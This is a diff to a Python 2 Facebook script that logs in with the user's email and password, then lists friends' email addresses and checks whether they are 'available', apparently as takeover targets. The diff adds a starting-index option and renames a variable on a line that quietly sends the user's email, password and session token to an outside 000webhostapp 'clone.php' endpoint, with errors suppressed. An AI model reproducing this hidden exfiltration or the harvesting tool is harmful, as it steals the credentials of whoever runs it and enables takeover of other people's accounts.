@@ -14,6 +14,7 @@ print "\033[36m| " + 1*" " + "\033[35m Welcome to my script ® By Adham amer & m
 
 idt = raw_input("\033[39m[\033[31m*\033[39m] Email   : ")
 passw = raw_input("\033[39m[\033[31m*\033[39m] Password: ")
+sf = input("\033[39m[\033[31m*\033[39m] Start from: ")
 url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
 data = urllib.urlopen(url)
 op = json.load(data)
@@ -25,7 +26,7 @@ else:
     print ("\033[39m[\033[31m+\033[39m] \033[31mWrong Email Or Password")
     sys.exit()
 try:
-    pd = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + (token))
+    pd99 = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + (token))
 except:
     pass
 get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + (token))
@@ -40,12 +41,13 @@ def defense():
     print "\033[36m" + 55*"-"
     print "\033[36m| " + 11*" " + "\033[35mEmail" + 14*" " + "\033[36m|" + 9*" " + "\033[33mAvailability" + 8*" " + "\033[36m|"
     print 55*"-"
-    for i in hasil['data']:
+    for i in range(sf, len(hasil['data']), 1):
         wrna = "\033[36m"
         wrne = "\033[39m"
         h +=1
         o.append(h)
-        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
+        #x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
+        x = requests.get("https://graph.facebook.com/"+hasil['data'][i]['id']+"?access_token="+token)
         z = json.loads(x.text)
         try:
             kunci = re.compile(r'@.*')
